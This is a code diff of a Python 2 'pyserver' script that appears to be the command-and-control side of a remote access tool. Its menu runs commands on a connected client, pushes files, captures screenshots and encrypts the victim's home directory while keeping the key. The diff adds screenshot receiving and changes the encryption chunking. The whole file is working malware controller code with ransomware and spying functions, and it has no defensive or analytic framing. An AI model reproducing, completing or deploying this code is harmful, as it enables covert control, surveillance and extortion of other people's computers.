@@ -12,6 +12,7 @@ from Crypto.PublicKey import RSA
 import pickle
 from Crypto.Cipher import PKCS1_OAEP 
 from base64 import b64decode
+from __builtin__ import str
 
 class pyserver:
     
@@ -68,6 +69,8 @@ class pyserver:
         
         while True:
             ip=raw_input("select the operation to perform\n\n1-send file\n2-execute command\n3-encrypt_user_home\n4-screenshot\n5-Quit\n\n")
+            
+            
             if ip=='1':
                 Tk().withdraw()
                 print "Browse the file you want to send"
@@ -81,6 +84,10 @@ class pyserver:
                 self.sendData(filecontent)
                 time.sleep(0.01)
                 self.sendData("QUIT")
+                print "File sent Successfully"
+            
+            
+            
             elif ip=='2':
                 while True:
                     self.sendData("CMD")
@@ -98,6 +105,7 @@ class pyserver:
                                 rdata+= buf
                         print rdata
                         
+            
             elif ip=='3':
                 print"encrypting user home directory\n"
                 self.sendData('EFS')
@@ -106,14 +114,40 @@ class pyserver:
                 print key
                 with open("EFS_Key",'wb')as f:
                     f.write(key)
+            
+            
+            
             elif ip=='4':
                 self.sendData("SCP")
+                count=0
+                self.writeImagetoFile()
+                print "Image successfully received"
+
+            
             elif ip=='5':
                 print "Closing the connection to client"
                 self.sock.close()
                 break
+            
+            
             else:
                 print "please enter a valid input"
+                
+    def writeImagetoFile(self):
+        rbuf=""
+        with open('test.png','wb') as f:
+            while 1:
+                buf = self.sock.recv(8192)
+                encmessage = b64decode(pickle.loads(buf))
+                msg=PKCS1_OAEP.new(self.RSAKey).decrypt(encmessage)
+                msg=msg.strip('~')
+                if msg=="QUIT":
+                    break
+                else:
+                    rbuf+=msg
+                    f.write(msg)
+            print "received file size is"+str(len(rbuf)/1024)
+#         self.sock.close()
                 
     def receiveData(self):
         while 1:
@@ -132,16 +166,16 @@ class pyserver:
         key = open("clientKey", "r").read() 
         clientKey= RSA.importKey(key)
         clientKey = PKCS1_OAEP.new(clientKey)
-        if(len(data)>100):
-            for i in range(100,len(data),100):
-                secretText = clientKey.encrypt(data[i-100:i])
+        if(len(data)>200):
+            for i in range(200,len(data),200):
+                secretText = clientKey.encrypt(data[i-200:i])
                 time.sleep(0.5)
                 self.sock.sendall(pickle.dumps(secretText.encode('base64')))
             secretText=clientKey.encrypt(data[(i):len(data)])
             time.sleep(0.5)
             self.sock.sendall(pickle.dumps(secretText.encode('base64')))
         else:
-            while len(data)<100:
+            while len(data)<200:
                 data+='~'
             secretText=clientKey.encrypt(data)
             self.sock.sendall(pickle.dumps(secretText.encode('base64')))
